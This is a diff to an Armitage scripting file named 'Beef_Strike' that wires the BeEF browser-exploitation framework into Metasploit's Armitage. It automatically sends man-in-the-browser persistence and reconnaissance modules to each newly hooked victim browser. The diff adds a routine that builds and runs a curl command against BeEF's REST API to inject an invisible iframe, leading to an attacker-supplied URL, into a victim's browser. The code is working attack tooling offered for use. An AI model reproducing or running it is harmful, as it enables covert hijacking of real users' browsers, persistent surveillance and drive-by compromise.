@@ -1,9 +1,9 @@
-# BeEF and Armitage integration  - by benyG
-# Tested on backtrack5r3
+﻿# Beef & Armitage integration - by benyG
+# Tested on Bactrack5r3
 # video demo: http://www.youtube.com/watch?v=YhKhkYzq2s8&feature=share&list=UU7_xeQ_4d8jAMtxdJgikjlA
 
 # At this time, This script doesn't use the beef_online command of beef metasploit plugin
-# to update zombies list. At result, but it try to reproduce it. 
+# to populate zombies list. But it try to reproduce host list. 
 # So if you try to add host while this script is running, you will falsify final result. 
 # Do your recruitment and Let Beef_strike add host for you. 
 #  
@@ -13,6 +13,7 @@ on ready {
 $console = console();
 $console = open_console_tab ("Beef Strike","all","zmb_hook",1);
 cmd($console , "load beef");
+say("Beef_Strike script is running");
 }
 
 on console_load {show_message("$3");
@@ -20,7 +21,15 @@ on console_load {show_message("$3");
 # on console_beef_connect {show_message("$3");}
 
 $first = 0 ;        # first beef's zombie id
+
 @beef_hosts = @(%());  # array of beef's zombies
+$key = "xxxxxxxxxxxxxxxx" ;
+# when zombie is offline icon must turn red.
+filter host_image {
+		$address = $2['address'];
+		push($1, script_resource("zombie.png")); 
+		return @_;
+		}
 
 popup attacks {
 	menu "BeEF Strike"{
@@ -30,9 +39,11 @@ popup attacks {
 		$import = 1;
 		$recon = 1;
 		cmd($console , "beef_disconnect");
-		$url = prompt_text("beef server URL","http://127.0.0.1:4000");
+	    $url = prompt_text("BeEF Server (with http://)","http://127.0.0.1:4000");
 		$user = prompt_text("User","beef");
 		$pass = prompt_text("Password","beef");
+		$key = prompt_text("RESTful API key","$key");
+		
 		cmd($console , "beef_connect $url $user $pass");
 		}
 
@@ -56,7 +67,7 @@ popup attacks {
 
 		item "Zombies" {
 		local('$zombitable');
-		$zombitable = open_table_tab("zombies", "", @("id", "address"), @(), @("Refresh"), "zmb_hook", 1);
+		$zombitable = open_table_tab("zombies", "", @("id", "address", "sessionID"), @(), @("Refresh"), "zmb_hook", 1);
 		refresh_hosts($zombitable);
 		}
 
@@ -80,7 +91,7 @@ popup attacks {
 		  append($console, "\c4 [*] Client-side auto recon. disable");                 			        $recon = 0 ;
 		        	}
 		}
-
+	
 		item "BeEF-Console" {
 		$console = open_console_tab ("Beef Strike","all","zmb_hook",1);
 		cmd($console , "load beef");
@@ -99,12 +110,6 @@ popup attacks {
 	}
 }
 
-#when zombie is offline icon must turn red.
-#filter host_image {
-#		$address = $2['address'];
-#		push($1, script_resource("zombie.png")); 
-#		return @_;
-#		}
 
 on heartbeat_15s {
 	if ( $import == 1 ) { 
@@ -116,32 +121,41 @@ on heartbeat_15s {
 popup zmb_hook {
 		menu "BeEF action" {
 		item "Information" { 
-		@idr = flatten(table_selected($1, "id"));		
-		$idr = @idr[0]; 
-		@adr = flatten(table_selected($1, "address"));		
-		$adr = @adr[0]; 
+		@idrz = flatten(table_selected($1, "id"));		
+		$idrz = @idrz[0]; 
+		@adrz = flatten(table_selected($1, "address"));		
+		$adrz = @adrz[0]; 
 	append($console, "+----------------------------------------------+");
-	append($console, "+--- \c7 zombie N° $idr --> $adr ---+");
+	append($console, "+--- \c7 zombie N° $idrz --> $adrz ---+");
 	append($console, "+----------------------------------------------+");
                     
-		cmd($console , "beef_target -i $idr");
+		cmd($console , "beef_target -i $idrz");
 	append($console, "+----------------------------------------------+");
 # result of this function appear on teamserver console
-		recon_result($idr);
-	append($console, "+----------------->  END  <--------------------+");
+		# recon_result($idrz);
+	#append($console, "+----------------->  END  <--------------------+");
 			}
 		item "Recon." {
-		@idr = flatten(table_selected($1, "id"));		
-		$idr = @idr[0];                
-		driverecon($idr);
+		@idrr = flatten(table_selected($1, "id"));		
+		$idrr = @idrr[0];                
+		driverecon($idrr);
 			 }
 		item "Drive-by" { 
-# Execute beef_target -e $id 27 and send invisible iframe to victim browser-
- 	$inviframe = prompt_text("URL","http://");
-	cmd($console , "beef_target -e $id 27"); # URL param not in use ...
-
- 				}
-		}	
+		   # add session ID manually
+		   @idrd = flatten(table_selected($1, "id"));		
+		   $idrd = @idr[0];   
+ 		   @sessidr = flatten(table_selected($1, "sessionID"));		
+		   $sessidr = @sessidr[0];
+	                  
+			 if ( $sessidr == "empty" ) { 
+		$session_id = prompt_text("Session ID (Copy & paste cookie number)","$sessidr");
+		%selectedhost = @beef_hosts[$idrd];
+		%selectedhost["sessionID"] = $session_id;
+		run_driveby($url, $session_id, $key);
+				} else { run_driveby($url, $sessidr, $key); 
+					}
+	 			}
+			}	
 	}
 
 sub refresh_hosts {
@@ -155,15 +169,17 @@ on tab_table_click {
 }
 
 on host_add {
-	# try to build result of beef_online command. 
-	%newhost = %(id => $first, address => "$1");
+	# try to build result of beef_online command.
+	$sessid = "empty";
+	%newhost = %(id => $first, address => "$1", sessionID => "$sessid");
+	
 	$id = %newhost["id"];
 	$ad = %newhost["address"];
 	show_message("new zombie > Id: $id -- IP: $ad");
 	add(@beef_hosts, %newhost, $first);
 	append($console, "\c9 Send MiTB module for Persistence ------->");	
 	cmd($console , "beef_target -e $id 32"); # MITB Persistence
-	cmd($console , "beef_target -e $id 30"); # POP-Under Persistence
+#	cmd($console , "beef_target -e $id 30"); # POP-Under Persistence
 	# feel free to add another persistence module here. 
 
 # Drive or not drive auto recon that's the question .
@@ -214,6 +230,17 @@ sub recon_result {
 	cmd($console , "beef_target -r $1 113"); # detect installed software (IE only)
 	append($console, "\c8 :-)");
 }
+
+sub run_driveby {
+	# Send invisible iframe to victim browser using sesion ID and RESTfull_API key
+	$inviframe = prompt_text("URL (with http://)","http://");
+	$link = "" . $1 . "/api/modules/" . $2 . "/27?token=$3";
+#	println($link);
+	$attak = "curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{\"target\":\"$inviframe\"}' -X POST " . $link . "";
+	println($attak);
+	append($console, "\c4 --> Send invisible iframe");
+	cmd($console , "$attak");
+	}
 
 # on console_beef_online{
 # 	@online = parse_table($3, @("Id", "IP", "OS"));
